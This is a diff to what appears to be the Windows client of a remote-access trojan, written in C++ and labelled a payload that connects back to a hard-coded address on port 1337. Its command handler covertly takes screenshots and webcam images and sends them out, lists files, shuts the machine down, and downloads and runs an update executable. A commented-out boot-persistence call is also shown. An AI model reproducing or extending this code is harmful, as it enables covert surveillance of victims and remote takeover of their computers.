@@ -1,24 +1,12 @@
 #define _WINSOCKAPI_
 
-// WEBCAM
-#define WM_CAP_START  0x0400
-#define WM_CAP_DRIVER_CONNECT  (WM_CAP_START + 10)
-#define WM_CAP_DRIVER_DISCONNECT  (WM_CAP_START + 11)
-#define WM_CAP_EDIT_COPY (WM_CAP_START + 30)
-#define WM_CAP_GRAB_FRAME (WM_CAP_START + 60)
-#define WM_CAP_SET_SCALE (WM_CAP_START + 53)
-#define WM_CAP_SET_PREVIEWRATE (WM_CAP_START + 52)
-#define WM_CAP_SET_PREVIEW (WM_CAP_START + 50)
-#define WM_CAP_DLG_VIDEOSOURCE  (WM_CAP_START + 42)
-#define WM_CAP_STOP (WM_CAP_START+ 68)
-
 #ifndef WIN32_LEAN_AND_MEAN
 #define WIN32_LEAN_AND_MEAN
 #endif
 
-#define PAYLOAD_VERSION "Windows v1.0.0"
-#define ADDRESS "127.0.0.1"
-// #define ADDRESS "192.168.1.37"
+#define PAYLOAD_VERSION "Windows v1.0.1 f3"
+// #define ADDRESS "127.0.0.1"
+#define ADDRESS "192.168.1.37"
 #define PORT 1337
 
 #include <winsock2.h>
@@ -43,6 +31,7 @@
 unsigned int G_UID;
 TCHAR ID[64];
 OSVERSIONINFOEX info;
+TCHAR exePath[MAX_PATH];
 
 #include "net.h"
 #include "fingerprint.h"
@@ -88,8 +77,8 @@ void handle(char *buff, BOOL *listen, BOOL *loop) {
     net::write(&sock, str);
 
   } else if (cmd == "screenshot") {
-    char *ss = utils::TakeScreenShot((char*)"C:\\img.bmp");
-    net::sendFile(&sock, (char*)"C:\\img.bmp");
+    char *ss = utils::TakeScreenShot((char*)"img.bmp");
+    net::sendFile(&sock, (char*)"img.bmp");
 
   } else if (cmd == "ls") {
     struct fs::s_folder folder;
@@ -106,8 +95,8 @@ void handle(char *buff, BOOL *listen, BOOL *loop) {
     utils::shutdown();
 
   } else if (cmd == "webcam") {
-    utils::captureWebcam((char*)"C:\\wc.bmp");
-    net::sendFile(&sock, (char*)"C:\\wc.bmp");
+    utils::captureWebcam((char*)"wc.bmp");
+    net::sendFile(&sock, (char*)"wc.bmp");
 
   } else if (cmd == "incoming") {
     std::stringstream ss;
@@ -132,7 +121,7 @@ void handle(char *buff, BOOL *listen, BOOL *loop) {
     unsigned int size = (unsigned int)atoi(sizeb.c_str());
     printf("\nTry download update %d bytes in %s\n", size, path.c_str());
     net::recieveFile(size, (char*)path.c_str());
-    utils::startup("bin.exe");
+    utils::startup((char*)path.c_str());
     *listen = FALSE;
     *loop = FALSE;
   }
@@ -145,7 +134,6 @@ int main() {
   info = fingerprint::getOSInfo();
   fingerprint::reconOS(ID, &info);
 
-  TCHAR exePath[MAX_PATH];
   GetModuleFileName(NULL, exePath, MAX_PATH);
   // addToBoot(exePath);
 
